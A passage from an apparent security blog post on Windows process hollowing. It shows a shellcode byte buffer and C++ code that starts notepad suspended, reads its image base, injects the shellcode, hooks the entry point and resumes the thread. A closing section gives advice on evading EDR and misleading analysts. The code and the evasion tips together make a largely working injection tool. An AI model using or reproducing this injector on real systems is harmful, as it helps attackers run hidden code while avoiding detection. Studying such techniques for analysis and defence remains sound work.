&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68\x6b\x74\x58\x20\x68\x74\x20\x72\x65\x68\x45\x3d\x67\x65&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68\x54\x49\x54\x4c\x68\x72\x65\x6b\x74\x68\x67\x65\x74\x20&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc9\x88\x4c\x24\x16\x89\xe1\x31\xd2\x52\x53\x51\x52\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd0\x31\xc0\x50\xff\x55\x08&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HOST&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; hostProcess &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; HOST();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LPSTARTUPINFOA si &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; STARTUPINFOA();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LPPROCESS_INFORMATION pi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; PROCESS_INFORMATION();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PROCESS_BASIC_INFORMATION&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pbi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; PROCESS_BASIC_INFORMATION();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DWORD returnLength &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CONTEXT ctx;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    SHELLCODE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; SHELLCODE();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; buf;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buf);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (CreateProcessA(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Windows&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;System32&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;notepad.exe&amp;#34;&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (LPSTR)&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Windows&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;System32&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;notepad.exe&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NULL, NULL, TRUE, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        CREATE_SUSPENDED &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; CREATE_NO_WINDOW, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        NULL, NULL, si, pi) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; FALSE)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Failed to execute notepad.exe&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; FALSE;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!]Executed notepad.exe&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;hProcess;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ctx.ContextFlags &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CONTEXT_FULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    fNtGetContextThread(pi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;hThread, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ctx);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    NtQueryInformationProcess(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ProcessBasicInformation, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        pbi,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(PROCESS_BASIC_INFORMATION), 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;returnLength);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DWORD pebImageBaseOffset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (DWORD)pbi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;PebBaseAddress &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    SIZE_T bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;ReadProcessMemory(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (LPCVOID)pebImageBaseOffset, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to read image base address&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PVOID remoteShellcodeAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; InjectShellcode(hostProcess, s);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (remoteShellcodeAddress &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;shellcode injection failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PVOID addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PatchHostProcess(hostProcess, remoteShellcodeAddress)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed tp patch host&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    fNtSetContextThread(pi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;hThread, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ctx);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Resumed thread&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ResumeThread(pi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;hThread);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Above code does exactly what is listed above. First, it starts a notepad
process suspend it&amp;rsquo;s exution. then it retrieves &lt;strong&gt;thread context&lt;/strong&gt; from theprocess. Thread context is important because, without setting context back
to what it was before suspending will cause a program crash.&lt;/p&gt;
&lt;p&gt;Then it proceed to retrieve &lt;strong&gt;ImageBaseAddress&lt;/strong&gt; of the process using
&lt;code&gt;NtQueryInformationProcess&lt;/code&gt; and &lt;code&gt;ReadProcessMemory&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Then the shellcode is injected into the target process by the function
&lt;strong&gt;InjectShellcode&lt;/strong&gt;. This function uses the same technique discussed
arlier.&lt;/p&gt;
&lt;p&gt;The main function then calls &lt;strong&gt;PatchHostProcess&lt;/strong&gt;. This function reads the
host process&amp;rsquo;s image into the memory and parses the entry point. Then in
the local copy, it creates a hook that jumps into the shellcode that
&lt;strong&gt;InjectShellcode&lt;/strong&gt; injected. Then it uses the above code injection method
and creates a section in the local process, however, before creating a
section in the remote process, it unmaps the process image using a call to
&lt;code&gt;ZwUnmapViewOfSection&lt;/code&gt;. it then creates the section at the same address
that the original image was mapped.&lt;/p&gt;
&lt;p&gt;Its worth noting that it is possible to hook any address of the process
image as long as it does not spawn notepad (or whatever).&lt;/p&gt;
&lt;p&gt;Result after compiling and running the code&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/4.png&#34; alt=&#34;result&#34;&gt;&lt;/p&gt;
&lt;p&gt;permissions of the shellcode&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/5.png&#34; alt=&#34;shellcode&amp;amp;rsquo;s permissions&#34;&gt;&lt;/p&gt;
&lt;p&gt;permissions of the original notepad image&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/6.png&#34; alt=&#34;notepad image&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;achieving-more-stealth&#34;&gt;Achieving more stealth&lt;/h2&gt;
&lt;p&gt;Even though the technique is capable of fooling both analysts and some EDR,it can be stll detected if defense solutions are monitoring
&lt;code&gt;CreateProcessA&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;There are many workarounds for this. One can directly call
&lt;code&gt;NtCreateUserProcess&lt;/code&gt; or &lt;code&gt;NtCreateProcessEx&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Another method is to Hook one of those APIs and call &lt;code&gt;CreateProcessA&lt;/code&gt; with
false arguments. For
example,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- Hook `NtCreateUserProcess` so it will jump into a specified location
- Call CreateProcessA without `CREATE_SUSPENDED` flag.
- Set `CREATE_SUSPENDED` flag and jump back to `NtCreateUserProcess`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(to learn more about above technique, my seggestion is to reverse IcedID)&lt;/p&gt;
&lt;p&gt;The other thing to consider is changing the memory permissions of the
target process after remapping. Even without doing that, it can mislead
an analyst to beleive it as the malicious binary since it has permissions
&lt;strong&gt;RWX&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Even after that, once analyst has dumped the original executable image
thinking it is malicous to analyze it, it is pretty easy to indeify the
hook. As stated earlier, it is possible hook any other location as long as
it does not start the original process.&lt;/p&gt;
&lt;p&gt;It is also possible to implement other instructions to change the control
flow. For example, &lt;code&gt;push / ret&lt;/code&gt;.&lt;/p&gt;
&lt;h1 id=&#34;references&#34;&gt;References&lt;/h1&gt;
